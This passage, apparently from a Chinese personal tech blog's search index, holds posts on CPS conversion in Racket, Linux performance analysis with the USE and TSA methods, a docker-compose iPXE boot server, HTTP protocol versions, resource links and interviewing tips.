(k) ((f (lambda (val) (lambda (_) (k val)))) k))) 邏輯上的關聯: callcc的type是? cont吃一個值之後就跳走，所以她的return val是什麼type? 沒關西，先當成P -\u0026gt; Q\ncallcc是什麼type? 吃一個func，接回去原本的運算，注意到因為這裡的return val與cont吃得一樣，所以用一樣的type F -\u0026gt; P\nF是什麼type? 吃一個cont，回傳某個值 (P -\u0026gt; Q) -\u0026gt; ?\n某個值是什麼type? 這func要接回去原本的運算，所以是P\n整個是((P -\u0026gt; Q) -\u0026gt; P) -\u0026gt; P\n這就是Peirce’s law，如果把Q帶成bottom(Absurd)，就可以得到排中律!!\nCPS conversion 在cont monad看到monad怎麼把cont藏起來 接著就是怎麼把這個k自己生出來，下面都用untyped lambda calculus\n說老實話，其實是為了這個才把這篇打出來的\n另外如果有人說，學遞迴要用trace實際執行過程，直接丟這個給他看，看他怎麼trace 或是說遞迴可以轉成loop，也是丟這個，看他怎麼轉\nnaive 先是base case，變數與lambda，這裡base case叫atomic 變數直接回傳，lambda要幫他開一個洞，把值傳回去\n(define (M expr) (match expr [`(λ (,var) ,expr) (define $k (gensym \u0026#39;$k)) `(λ (,var ,$k) ,(T expr $k))] [(? symbol?) expr])) 剩下就是apply，每個都要先轉沒問題，那這裡要放什麼? 可以先看看簡單的case: (f v)且都是變數 最保險就是每個都要轉(過M)，\n((λ (a) ((λ (b) (k (a b))) ;; !! v)) f) 等等，現在a會多一個cont\n((λ (a) ((λ (b) (a b k)) ;; good v)) f) (define (T expr k) (match expr [`(λ . ,_) `(,k ,(M expr))] [(? symbol?) `(,k ,(M expr))] [`(,F ,V) (define $f (gensym \u0026#39;$f)) (define $v (gensym \u0026#39;$v)) (T F `(λ (,$f) ,(T V `(λ (,$v) (,$f ,$v ,k)))))])) (T \u0026#39;(g a) \u0026#39;halt) 變成\n((λ ($f1445) ((λ ($e1446) ($f1445 $e1446 halt)) a)) g) high-order 最保險的方式可以work，但output有點長，為什麼不直接apply進去?\n怎麼直接apply進去? 我們不是有現成的函數嗎\n重新看T的base case，這裡如果可以直接apply函數，就可以把那坨去掉 換言之，我們原本在k傳的是symbol，但現在是racket的function，最後回傳symbol 所以先把quote拿掉\n(define (T expr k) (match expr [`(λ . ,_) (k (M expr))] [(? symbol?) (k (M expr))] [`(,F ,V) (T F (λ (f) (T V (λ (v) `(,f ,v ,k)))))])) ;; !! 等等，這裡k是racket的lambdaㄟ 這裡要是quote，所以要把(f v)的拉到原本的k去\n(define (T expr k) (match expr [`(λ . ,_) (k (M expr))] [(? symbol?) (k (M expr))] [`(,F ,V) (define $ret (gensym `$ret)) (define cont `(λ (,$ret) ,(k $ret))) (T F (λ (f) (T V (λ (v) `(,f ,v ,cont)))))])) 回來看M，會看到lambda的k要改，改成racket的lambda，最後回傳symbol\n(define (M expr) (match expr [`(λ (,var) ,expr) (define $k (gensym \u0026#39;$k)) `(λ (,var ,$k) ,(T expr (λ (ret) `(,$k ,ret))))] [(? symbol?) expr])) (T \u0026#39;(g a) (λ (ans) `(halt ,ans))) 變成\n(g a (λ ($rv1) (halt $rv1))) 少很多，但能不能更好，那個lambda很多餘\n混合 多的lambda來自T的cont，但又不能直接去掉，有什麼辦法? 回去看怎麼用的，不覺得很怪嗎，明明是轉symbol卻要寫lambda，有沒有辦法變成最初的方式去call\n所以第一層可以先抄第一種T\n(define (T-symbol expr k-symbol) (match expr [`(λ . ,_) `(,k-symbol (M expr))] [(? symbol?) `(,k-symbol (M expr))] [`(,F ,V) ... ])) 但apply用第二種T\n(define (T-symbol expr k-symbol) (match expr [`(λ . ,_) `(,k-symbol ,(M expr))] [(? symbol?) `(,k-symbol ,(M expr))] [`(,F ,V) (T-func F (λ (f) (T-func V (λ (v) `(,f ,v ,k-symbol)))))])) 再抄第二種T\n(define (T-func expr k-func) (match expr [`(λ . ,_) (k-func (M expr))] [(? symbol?) (k-func (M expr))] [`(,F ,V) (define $ret (gensym `$ret)) (define cont `(λ (,$ret) ,(k-func $ret))) (T-func F (λ (f) (T-func V (λ (v) `(,f ,v ,cont)))))])) M要抄第一種，觀察兩個T的base case，會看到(M expr)，最後都是要被展開成symbol 所以選都是symbol的第一種\n(define (M expr) (match expr [`(λ (,var) ,expr) (define $k (gensym \u0026#39;$k)) `(λ (,var ,$k) ,(T-symbol expr $k))] [(? symbol?) expr])) (T-symbol \u0026#39;(g a) \u0026#39;halt) 變成\n(g a halt) partition 這個是為了還原calling stack而產生的\n要還原calling stack需要知道誰是caller，與之後衍生的 所以回去看生出cont的部分(幫lambda多一格的部分)\n(define (T-func expr k-func) (match expr [`(λ . ,_) (k-func (M expr))] [(? symbol?) (k-func (M expr))] [`(,F ,V) (define $ret (gensym `$ret)) ;; 1 (define cont `(λ (,$ret) ,(k-func $ret))) (T-func F (λ (f) (T-func V (λ (v) `(,f ,v ,cont)))))])) (define (M expr) (match expr [`(λ (,var) ,expr) (define $k (gensym \u0026#39;$k)) ;; 2 `(λ (,var ,$k) ,(T-symbol expr $k))] [(? symbol?) expr])) 1是起點，也就是apply；2是中間。 所以把1的symbol標成user, 2是cont\n(define (T-func expr k-func) (match expr [`(λ . ,_) (k-func (M expr))] [(? symbol?) (k-func (M expr))] [`(,F ,V) (define $ret (genusym `$ret)) ;; 1 (define cont `(λ (,$ret) ,(k-func $ret))) (T-func F (λ (f) (T-func V (λ (v) `(,f ,v ,cont)))))])) (define (M expr) (match expr [`(λ (,var) ,expr) (define $k (genksym \u0026#39;$k)) ;; 2 `(λ (,var ,$k) ,(T-symbol expr $k))] [(? symbol?) expr])) 在ref中還有scheme的轉換，但其實就是多了不定數量參數列的處理\nTODO delimit cont 據說cooperative的thread加macro可以變成preemptive! Closure conversion: How to compile lambda\nRef Continuations by example: Exceptions, time-traveling search, generators, threads, and coroutines Appendix: An implementation of dynamic-wind 如何解释 Lisp 中 call/cc 的概念？ 用call/cc合成所有的控制流结构 How to compile with continuations\n","permalink":"https://littlebees.github.io/2021/11/continuation%E6%95%B4%E7%90%86%E8%88%87cps%E8%BD%89%E6%8F%9B/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e整理continuation與CPS轉換\u003c/p\u003e","title":"continuation整理與CPS轉換"},{"content":"動機 紀錄\nurls 房租簽約要注意哪些重點？三分鐘教你判斷合約好壞\n【密技】台灣軟體業業界現況詳解、軟體工程師指南\n哪些事是你当了领导才明白的？\n【心得】勞基法自保之道(勞方)\n信任的演化\n哈佛大學談判學程參與有感\n荷蘭PM工作筆記：三個步驟協助工作團隊的「雷隊友」一起進步\n這是一個創業失敗的故事-青創的現實提醒與四個叮嚀\n接案最先碰到的問題 — 案源從哪裡來？\n林超：给年轻人的跨学科通识课\n【構圖】從電影學習精彩構圖 工作 【轉職必看】面試後端工程師，我該準備什麼作品集？\n經歷就是「秀肌肉」：多想五分鐘，救活你的履歷\n撰寫履歷：如何吸引賞識你的人\n程式設計師的履歷撰寫要點\n原來104徵才系統是這樣找人的\n語言與日文學習 發音要自學照我這樣做，過程簡單又快速\n昔話法廷\n滑舌を良くする早口言葉の練習方法とは？\n留學申請 — TOEFL 自修備考心得分享\n留學經驗 留美碩士經驗分享：到美國讀研究所總共要花多少錢？ 如果知道這條路充滿地雷仍堅持「千萬人吾往矣」，那就來念博士吧\n繪畫 漫畫創作、繪圖教學整理 繪圖教學資源整理 【心得】內容優質學習畫畫的免費線上影片 【贵哥汉化】透视入门【零基础新手向】绘画教程 人を描くのって楽しいね 【心得】【進步史】練習的方法與個人認為畫力進步的要點 【電繪心得】線稿的層級 【心得】繪圖學習個人經驗 sensei\n資安 我們與 OSCP 的距離 root-me\n","permalink":"https://littlebees.github.io/2021/10/%E6%9C%89%E7%94%A8%E7%9A%84%E9%80%A3%E7%B5%90/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e紀錄\u003c/p\u003e","title":"有用的連結"},{"content":"動機 linggle真的好用\n教學 Online Creative Writing Courses Offered Free by Top Universities and Educational Websites Purdue Online Writing Lab\nsearch engine 下面兩個是查用法，像後面要接什麼介詞之類的 netspeak linggle\n查同義詞 thesaurus\n","permalink":"https://littlebees.github.io/2021/10/%E8%8B%B1%E6%96%87%E5%AF%AB%E4%BD%9C%E6%95%99%E5%AD%B8%E8%B3%87%E6%BA%90/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003elinggle真的好用\u003c/p\u003e","title":"英文寫作教學資源"},{"content":"動機 紀錄\nuse method 建立一個checklist去分析system的performance (bottleneck, error) checklist的項目是建立在系統resource的utilization, saturation, errors\nsystem 系統有\nresource: 任何有限制或上限的資源 限制 software: hypervisor, container CPU, network, mem, io hardware: 硬體本身的spec, network throughput utilization: 在一段時間，有多少時間是忙的 100%: 有bottleneck，但要確認saturation與實際上的影響 像deadlock就是整個都會停下來 \u0026gt;=70% 如果單位時間太長，會讓utilization少，把小的burst藏起來 saturation: 有多少工作是因為太忙無法處理的 低utilization代表沒有saturation? 也許長時間的utilization低，但是 短時間的burst，就可以讓utilization衝到100%!! 如果有saturation就是有事，去看在queue的waiting time或是queue length errors: error events!! 有就是出事，尤其在效能低下時 另一個是描述系統各元件溝通與連結的Functional Block Diagram 如果不懂，找個硬體工程師吧 可以在每個箭頭上標他們的bandwidth，有的時候光是這樣就會知道bottleneck在哪\n有什麼資源 CPUs: sockets, cores, hardware threads (virtual CPUs)\nMemory: capacity\nNetwork interfaces\nStorage devices: I/O, capacity\nControllers: storage, network cards\nInterconnects: CPUs, memory, I/O\n通常不是這裡成為bottleneck，但如果是就要考慮zero-copy之類的技術 mutex locks\nutilization: 鎖被持有多久 saturation: 有多少process在等 thread pools\nutilization: 所有thread處理的時間 saturation: 有多少request還沒被pool受理 process/thread/file descriptor capacity\nutilization: 有多少process被allocate (一般來說process的數量都有上限) saturation: 還沒被allocation process還有多少 error: fork失敗之類的 有趣的是，cache不在裡面，因為cache是幫助system在高利用率與高飽和率時讓system變好的，所以USE method不會去看cache\nUSE method是看會被高utilization與高saturation搞垮的元件 在跑完USE method之後可以看其他效能指標，cache miss等等\n指標 resourcetypemetric CPUutilizationCPU utilization (either per-CPU or a system-wide average) CPUsaturationrun-queue length or scheduler latency(aka Memory capacityutilizationavailable free memory (system-wide) Memory capacitysaturationanonymous paging or thread swapping (maybe \"page scanning\" too) Network interfaceutilizationRX/TX throughput / max bandwidth Storage device I/Outilizationdevice busy percent Storage device I/Osaturationwait queue length Storage device I/Oerrorsdevice errors (\"soft\", \"hard\", ...) resourcetypemetric CPUerrorseg, correctable CPU cache ECC events or faulted CPUs (if the OS+HW supports that) Memory capacityerrorseg, failed malloc()s (although this is usually due to virtual memory exhaustion, not physical) Networksaturationsaturation related NIC or OS events; eg \"dropped\", \"overruns\" Storage controllerutilizationdepends on the controller; it may have a max IOPS or throughput that can be checked vs current activity CPU interconnectutilizationper port throughput / max bandwidth (CPU performance counters) Memory interconnectsaturationmemory stall cycles, high CPI (CPU performance counters) I/O interconnectutilizationbus throughput / max bandwidth (performance counters may exist on your HW; eg, Intel \"uncore\" events) 單位都是 次數、一段時間的平均數 另外不是所有指標都可以取得，有些指標需要自己寫程式去拿\n指令 (for linux) uptime 看 想用CPU的process 在等uninterruptible IO(disk io)的process 測量時間單位: 1min, 5min, 15mins dmesg | tail 看 error: tcp drop, oom-kill vmstat 1: 1秒一行 r: 有多少想用CPU的process free: free mem si, so: swap-in, swap-out (有就是實體記憶體沒了) us, sy, id, wa, st: total cpu time user, system(kernel), idle, wait io, stolen 可以看出cpu忙不忙 (user+system) wait io可以看成idle，這可以當成idle的理由 mpstat -P ALL 1: 所有cpu，1秒一行 與前面很像，但是可以看到每個virtual cpu的usage 這是有irq與sortirq，都是中斷，通常是用kernel處理的資料，像網路 pidstat 1 很像top，但是以時間為主 會列出當下再跑的process以及process的cpu時間 iostat -xz 1 r/s, w/s, rkB/s, wkB/s: read, write的速度 await: io的時間，如果比一般情況還差就是device出事 avgqu-sz: 有多少req在等，大於1就是device saturation %util: Device utilization 有的dev是logic的，所以就算util 100%，背後的裝置也許很閒 free -m 就是看有沒有0，有就是記憶體要用完了 sar -n DEV 1 看network iface的throughput sar -n TCP,ETCP 1 看tcp connection!! active/s: 有多少從host出去的tcp passive/s: 有多少從remote進來的tcp retrans/s: retransmits top 再一次確認這裡看到的數字是不是與之前差不多 top是以process去排列，這樣不好觀察pattern Ctrl-S to pause, Ctrl-Q to continue tsa method tsa處理thread的performance\n觀察thread在各個state所花費的時間 根據各個state所花費的時間去研究root cause state Executing: on-CPU Waiting: Runnable: and waiting for a turn on-CPU user (userspace) kernel (kernel space) Anonymous Paging: (aka swapping) runnable, but blocked waiting for residency Sleeping: waiting for I/O, including network, block, and data/text page-ins 可以依據sleep的理由往下切 storage network other 或是 uninterruptibe wait interruptibe wait Lock: waiting to acquire a synchronization lock (waiting on someone else) Idle: waiting for work Anonymous Paging應該往下畫 The Runnable, Anonymous Paging, Sleeping, and Lock states measure time spent waiting while performing work: a measure of latency. Tuning these latency states often provides the greatest wins, as their state time can be reduced to zero.\n像是Anonymous Paging太多(應該要是趨近0才對)，就去看memory\n該看什麼 (怎麼與system相關) StateDescriptionInvestigate ExecutingRunning on-CPUSplit into user and system time. For user time, use CPU profilers to identify hot code paths. For system time, examine syscall rates, and profile kernel CPU time. Profiling can include Flame Graphs. Note that CPU time can include spinning on a lock. RunnableRun queue latencyCheck system-wide CPU utilization and saturation, for both physical CPUs and any imposed resource controls (eg, USE Method). Check for any processor binding, which can affect CPU scheduling. Anonymous PagingRunnable, but either swapped-out or paged-out, and waiting for residencyCheck system-wide main memory availability. Also check for any resource control limiting memory usage. Saturation metrics can be studied: paging and swapping (eg, following the USE Method). SleepingWaiting for I/O, including network, block, and data/text page-insCheck syscalls, resource usage, thread blocking. Syscalls: identify time in syscalls and identify the related resource; also check for mmap() usage and non-syscall I/O via mappings. Resource usage: eg, the USE Method to identify busy resources. Thread blocking: trace scheduler off-CPU events with user and kernel stacks to identify reason; see Off-CPU Performance Analysis. LockWaiting to acquire a synchronization lock (waiting on someone else)Identify the lock the thread is waiting on, and the reason it took time to acquire. Lock analysis. IdleWaiting for workCheck the client load applied. 下面是Solaris的例子 Ref The USE Method The TSA Method Linux Performance Analysis in 60,000 Milliseconds Netflix at Velocity 2015: Linux Performance Tools\n","permalink":"https://littlebees.github.io/2021/10/%E6%80%8E%E9%BA%BC%E5%88%86%E6%9E%90%E7%B3%BB%E7%B5%B1/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e紀錄\u003c/p\u003e","title":"怎麼分析系統"},{"content":"動機 就是把windows與ubuntu的安裝整合在一起 (都是uefi)\nSol 整體結構 dhcp回dhcp-boot，讓client拉ipxe的執行檔 ipxe透過tftp拉真正的menu，ipxe在透過http拉需要的東西 general: kernel要知道怎麼透過網路去找安裝程式，所以下面就有兩種方式 一個shell給你作事 (winpe) 有魔改的kernel，裡面放url (netboot)，或是透過kernel args傳nfs windows: 透過wimboot引導winpe winpe再連到自己host windows iso的地方 ubuntu: 就是load kernel與initrd 之後裡面魔改後kernel與initrd會去ubuntu拉ubuntu iso 也因為魔改過(應該是initrd)，所以有自動回答文件 可以看這裡 網路 這次是把 dhcp, tftp, web, router整合在同一台，只用一個網孔，因為我的respi2只有一個孔。\n所以整個網路就是電腦一個孔要吃兩個網路，有兩個方式\nip alias, vlan: 應該可以用，但我沒試 從現有的net分幾個ip給dhcp發: 這裡用這個方法 假設dhcp的假子網路: 192.168.81.20~192.168.81.25 要處理snat，\niptables -P FORWARD ACCEPT iptables -t nat -A POSTROUTING -m iprange --src-range 192.168.81.20-192.168.81.25 -j MASQUERADE dhcpd dhcpd.conf\nddns-update-style none; ignore client-updates; allow booting; allow bootp; subnet 192.168.81.0 netmask 255.255.255.0 { range 192.168.81.20 192.168.81.25; option broadcast-address 192.168.81.2; option subnet-mask 255.255.255.0; option domain-name-servers 8.8.8.8; class \u0026#34;pxeclients\u0026#34; { match if substring (option vendor-class-identifier, 0, 9) = \u0026#34;PXEClient\u0026#34;; next-server 192.168.81.160; filename \u0026#34;ipxe.efi\u0026#34;; } } tftpd tftpd.remap 都是因為window的斜線是反的!!\nrg \\\\ / nginx /etc/nginx/nginx.conf 裡面的user要改成root，不然沒辦法掛在mnt\nuser root; worker_processes auto; error_log /var/log/nginx/error.log notice; pid /var/run/nginx.pid; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log /var/log/nginx/access.log main; sendfile on; #tcp_nopush on; keepalive_timeout 65; #gzip on; include /etc/nginx/conf.d/*.conf; } /etc/conf.d/default.conf\nserver { listen 80 default_server; listen [::]:80 default_server; root /var/www/html; index index.html index.htm index.nginx-debian.html; server_name _; location / { autoindex on; autoindex_exact_size off; autoindex_format html; autoindex_localtime on; root /mnt/; } } ipxe clone code\nsudo apt-get install -y git gcc make liblzma-dev git clone https://github.com/ipxe/ipxe.git cd ipxe/src embed.ipxe\n#!ipxe dhcp chain tftp://${next-server}/main.ipxe || shell 編ipxe\nmake bin-x86_64-linux/ipxe.pxe EMBED=embed.ipxe main.ipxe\n#!ipxe # dhcp set http-root http://${next-server} # Some menu defaults set menu-timeout 5000 set submenu-timeout ${menu-timeout} set menu-default ubuntu1804_inst :start menu iPXE boot menu item --gap -- ---------------------------- Installers ---------------------------------- item --key u ubuntu_inst Install Ubuntu item --key e windows10_uefi_inst Install Windows 10 item --gap -- ------------------------- Advanced options ------------------------------- item shell Drop to iPXE shell item reboot Reboot item item --key x exit Exit iPXE and continue BIOS boot choose --timeout ${menu-timeout} --default ${menu-default} selected || goto cancel set menu-timeout 0 goto ${selected} :cancel echo You cancelled the menu, dropping you to a shell :shell echo Type \u0026#39;exit\u0026#39; to get the back to the menu shell set menu-timeout 0 set submenu-timeout 0 goto start :reboot reboot :exit exit :windows10_uefi_inst kernel ${http-root}/windows/wimboot initrd ${http-root}/windows/BCD BCD initrd ${http-root}/windows/boot.sdi boot.sdi initrd ${http-root}/windows/boot.wim boot.wim boot :ubuntu_inst kernel ${http-root}/ubuntu/linux initrd=initrd.gz initrd ${http-root}/ubuntu/initrd.gz boot 資料夾結構 / files web windows boot.wim: winpe的kernel wimboot: ipxe用來load winpe的魔法 boot.sdi: winpe的ramdisk BCD: windows的bootloader ubuntu linux: ubuntu的netboot kernel download now initrd.gz: ubuntu的netboot initramfs download now tftpd main.ipxe ipxe.efi confs tftpd tftpd.remap nginx nginx.conf default.conf dhcpd dhcpd.conf docker compose docker的server一般要知道要開什麼port，但如果懶就用--net host，在compose就用network_mode: host\n附上常用的docker指令\n創container (d是detach, v是volume) docker run -d --name \u0026lt;container name\u0026gt; --net host -v \u0026lt;host path\u0026gt;:\u0026lt;container path\u0026gt; \u0026lt;image name\u0026gt; debug需要 (f就是tail的f) docker logs -f \u0026lt;container name\u0026gt; docker-compose logs -f 連進去確認container狀況 docker exec -it \u0026lt;container name\u0026gt; /bin/sh 直接關掉與刪掉container (f是force) docker rm -f \u0026lt;container name\u0026gt; services: dhcpd: image: networkboot/dhcpd network_mode: host volumes: - /confs/dhcpd:/data tftpd: image: 3x3cut0r/tftpd-hpa ports: - \u0026#34;69:69/udp\u0026#34; volumes: - /files/tftpd:/tftpboot - /confs/tftpd/tftpd.remap:/mapfile environment: MAPFILE: /mapfile nginx: image: nginx:alpine ports: - \u0026#34;80:80\u0026#34; volumes: - /confs/nginx/nginx.conf:/etc/nginx/nginx.conf - /confs/nginx/default.conf:/etc/nginx/conf.d/default.conf - /files/web:/mnt 坑 不要用dnsmasq 雖然說dhcp, tftp都有，但是不知道為什麼在winpe的uefi開機時都會出事\ndhcp好像有錯，同時tftp不能remap，所以只能用別款\n不要用virtualbox實驗 virtualbox的nat網路不是真正的nat，要自己創nat網路\u0026hellip; 雖說原本的nat支援pxe，但實際上無法用自己網路來構成pxe開機，只能算是模擬\n每次都重建一台vm 有遇到winpe一直卡在wpeinit的事，但是自從每次都重建要被裝os的vm來實驗後就沒遇過了\n直接用iscsi掛iso去boot不work 因為轉到iscis之後，雖然是iso的執行環境， 但iso還要從iso載入其他檔案，會因為不知道iscsi的target在哪，就直接出事。\nRef why-are-my-two-virtual-machines-getting-the-same-ip-address 解决Nginx出现403 forbidden is-it-possible-to-have-a-root-path-containing-spaces-in-my-nginx-conf build ipxe iPXE编译增加功能与自定义脚本 折腾网络启动（2）iPXE 篇\n","permalink":"https://littlebees.github.io/2021/10/%E7%94%A8docker-compose%E5%BB%BA%E4%B8%80%E5%80%8Bipxe%E7%9A%84server/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就是把windows與ubuntu的安裝整合在一起 (都是uefi)\u003c/p\u003e","title":"用docker compose建一個ipxe的server"},{"content":"動機 記錄用\nhttp 1.0 一個http req對到一個tcp socket。 以每個檔案為單位，去開http request，所有網頁有關的檔案都會各自開一個http。 等拿到一個檔案再開下一個http request。\nheader 內容 協商,類型,編碼 名詞 request Accept 資料的類型，要看MIME 像 application/json, */* 權重: application/xml;q=0.9,application/json, text/*;q=0.8 application/json最高(1)，application/xml次高(0.9) Accept-Charset 就是charset，像utf8 Accept-Encoding 怎麼壓縮資料 Accept-Language 就是語言 response Content-Type 對到Accept \u0026amp; Accept-Charset application/x-www-form-urlencoded; charset=utf-8 這是form表單 payload會像name=tom\u0026amp;password=9487 Content-Encoding 對到Accept-Encoding Content-Language 對到Accept-Language Content-Location 資料的實際位置 cache Cache-Control no-store: 每次都重拿 no-cache: 每次都發req驗證 max-age: max-age=10，十秒後才會發req stale-while-revalidate: 先拿原本的cache，同時在背景向伺服器發送請求 public \u0026amp; private: Last-Modified \u0026amp; Etag 都是cache的stamp 一個是 時間 一個是 hash(md5) If-Modified-Since \u0026amp; If-None-Match 就是驗證時把stamp丟給server看的 Referer \u0026amp; Refresh request Referer: 上一個網址 response Refresh: 重新導向跳轉 (5秒後跳到w3) Refresh: 5; url=http://www.w3.org 同源 request Origin: 我的domain是 Access-Control-Request-Origin: 向server發問這個origin會不會過同源 後面的Origin還可以換成 Methods, Headers response Access-Control-Allow-Origin: 能吃的domian 後面的Origin還可以換成 Methods, Headers http 1.1 http1會開很多tcp socket，tcp socket也是要$，所以有了keep-alive\nkeep-alive 在header放，Connection: Keep-Alive，表示這個socket傳完不用關掉 只要server也有一樣的response，就是使用keep-alive\n但只限制在該網頁，所以現在http1.1是以每個網頁為單位，只要不同tab就是新的tcp socket\npipeline 現在有keep-alive，但還是只能等拿到一個檔案再開下一個http request。 所以有pipeline，可以先給多個http request，但是\nserver還是一個一個回且照順序 (head-of-line blocking) 只能用於GET, HEAD之類，Idempotent的verb websocket 有了keep-alive，但server沒辦法主動推資料給client\n如果client要更新資料只能自己做poll，雖說有數個技術，但就只是差在poll後會保留多久這個用來查詢更新的socket\n所以有了websocket，與http同樣用80,443 port，但是包自己的pkt header，就可以把資料切小(frame)，讓接收端重組資料(少了flow-control、congestion-control的tcp)\n0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-------+-+-------------+-------------------------------+ |F|R|R|R| opcode|M| Payload len | Extended payload length | |I|S|S|S| (4) |A| (7) | (16/64) | |N|V|V|V| |S| | (if payload len==126/127) | | |1|2|3| |K| | | +-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - + | Extended payload length continued, if payload len == 127 | + - - - - - - - - - - - - - - - +-------------------------------+ | |Masking-key, if MASK set to 1 | +-------------------------------+-------------------------------+ | Masking-key (continued) | Payload Data | +-------------------------------- - - - - - - - - - - - - - - - + : Payload Data continued ... : + - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - + | Payload Data continued ... | 使用方法是\n先發http req，但裡面放 Upgrade: websocket Connection: Upgrade 如果ok，server的res也會有一樣的東西，之後就是websocket了 Server-sent events(sse) 但是這是新protocol，有沒有方法在http上做改進? Server-sent events就是在傳回資料時，標這是streaming，讓client不要關連線。\n這樣能完成server push，但是只有單向!!\n用法是\n放下面的header Content-Type: text/event-stream Cache-Control: no-cache Connection: keep-alive 開始丟資料 (資料有另外的格式，但這裡跳過) http2 一次大改版，可以想成在tcp與http1.1之間引入一層轉換層，來達成下面4點\n都用binary http原本都是text websocket可以是text也可以是binary 會壓縮header 所有東西都分割成frame傳輸， multiplexing: 不用等前面的檔案傳好!! 直接傳各自組合 Prioritization: 可以列優先序 server push server可以把資料先推到client的cache websocket與sse都是與應用程式溝通，這裡是cache!! websocket是重新設計自己的protocol，使用http的port http2是使用http的header與語意，但是改變資料的表現方式與處理方式\nwebsocket是新protocol，http2是改進的http\nhttp2與websocket都可以在同一條路上同時傳輸(full-deplex)!! 但http2的方向主要是client-\u0026gt;server之後server-\u0026gt;server，server push沒有真正的雙向，websocket才是真正的雙向\nRef HTTP persistent connection What is the difference between HTTP/1.1 pipelining and HTTP/2 multiplexing? HTTP 內容協商 HTTP 內容類型 HTTP Cache 快取 WebSocket协议入门介绍 Server-Sent Events 教程 HTTP／1.0／1.1／2.0的区别以及http和https的区别\n","permalink":"https://littlebees.github.io/2021/10/http-protocol/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e記錄用\u003c/p\u003e","title":"http-protocol"},{"content":"動機 這篇是結合採訪、寫作、survey的總結文 採訪與survey很像但不同是面對的是人，所以另外用quote的方式附上採訪的重點\n怎麼產生問題? 替換一部份，看會發生什麼結果 為什麼是這個結果 明明是同一類型，感受卻不同 什麼感受 有稀有的物件嗎? 有極化的數據嗎? 採訪(研究一個人)的話 不要問初階的蠢問題，也不要問普遍能套在每一個人身上的泛泛之論，這代表你一點功課都沒做，先做功課，才能問出進階的問題，問到對方心坎裡\n那個畫面其實非常短暫，一閃而逝，多年前我第一次看以天安門六四學運為背景的《頤和園》，並沒有看到這個鏡頭。那次採訪婁燁前，我把他的電影全部找出來重看一遍。只能說天道酬勤，這個可能連一秒都不到的畫面，先決條件一，或許要看兩三遍後不被劇情牽著走，才能發覺這個微小的細節，條件二，要能看得懂他的「用典」，知道是楚浮的電影。\n人物訪問我通常會做受訪者個人年表（出生、畢業、結婚等），佐以歷史年表，例如二二八、美麗島、解嚴、文革、六四……他當時幾歲（也兼及他的父、母親，祖父、母幾歲），他肯談當然好，如果沒有，為什麼這段歷史記憶在他的生命史留白。\n我會特別留意一個人的青年時代，那個時期將觸角開始伸往世界，容易帶著理想主義，如果他持續下來了，為什麼？如果他改變了，又為了什麼？事先做功課，如果知道年輕時代影響他的書籍和電影，在時間許可下，我會盡可能都找來看。\n要讓人物立體有層次感，當然不能只聽他說，大量的側訪，就是在光中尋影。 以前在《壹週刊》人物組，要求記者一個人物必須要有5個以上的側訪，採訪他的家人朋友同事等等。\n儘管只是襯托紅花的綠葉，都會以面對面訪問為優先，電訪其次。見面三分情，為了一個側訪，我曾專程搭高鐵去台中，如果只透過電話，對方會想要很快將你打發，見了面，記者有說有笑表情十足，就是一個活生生可託付「秘密」的人。\n第一次側訪的內容，完全不能用。第二次側訪，將她的人際關係往外擴一圈，找的不是最親近的摯友，只是蘇建和案曾合作的法律界一般友人，才終於問到可用的細節。\n側訪的最高等級，是找到他的敵人。敵人不一定是字面意義上的敵人，而是處於亦敵亦友的灰色地帶，或者就是所謂的瑜亮情結。\n收集資料的方向 要研究的、類似的領域 各家說法 關鍵字 要素、性質 只有擦到邊的、背景的領域 採訪(研究一個人)的話 採訪之前先給訪綱，我通常會列10個問題（不多也不少），列訪綱就是一種功力，什麼問題在先，什麼問題在後，輕重緩急需有層次。\n訪綱主要的用意是寫給受訪者看，在露出的冰山之下，還有隱藏版的秘密問題，是不得不問，但直接列在訪綱裡會讓對方產生戒心，需暖場之後才圖窮匕見，夾藏在其他問題裡不經意問出來。\n如果迷了路，不要慌張。每個受訪者都是一本大書，打開他，一定有可觀之處。一個人閱讀的軌跡，往往可以卻顧所來徑。如果可以選擇，我最想去受訪者的書房，看他們有什麼書，所有的蛛絲馬跡都在書架上，藏也藏不住。\n有些時候，重點不是受訪者回答了什麼，而是他的肢體動作、舉手投足、服飾衣著、說話語速的輕重快慢，甚至是呼吸喘氣的頻率，都很有戲。\n我對刺點的理解是畫面中的不協調、矛盾與衝突。遭遇一個人，來到一個陌生的場域，通常我印象最深刻的，是破壞和諧、格格不入的一個小細節，擾動後形成張力。\n除了眼鏡，還有鞋子。初次見到一個人，我最喜歡觀察他穿什麼鞋子，鞋子是一個人身上最容易被忽略，但卻是最接地氣的配件\n離開現場，觀察並不是就此結束了，儘管只是事後整理錄音檔，都最好不要請別人代勞。首要當然是整理出逐字稿，而魔鬼往往藏在細節裡，藏在一個顫音，一次結巴，或一串暢快的笑聲中。\n整理 \u0026amp; 收集 的loop 中間會遇到關鍵字，一開始會不清楚，但隨著資料找得越多，會抓到關鍵字之間的關係，或是說這個domain想表達的東西、結構 有的時候不知道這關鍵字是什麼或是關鍵字之間的關係? 這通常出現在遇到不熟的domain時經驗不夠多，不知道keyword 用其他類似domain的詞硬湊 把domain的基本知識補完 留意資料的品質 敘事、評論要留意 問的問題對不對 使用的客觀事實對不對 推導過程對不對 結論有沒有與立論相關 很常看到的是偷渡概念 也就是同一名詞但代表的概念不同，讓後面的論述可以變成自己喜歡的結論 其他的可以找紀錄常見謬誤的書 技術類要看 概念、結構 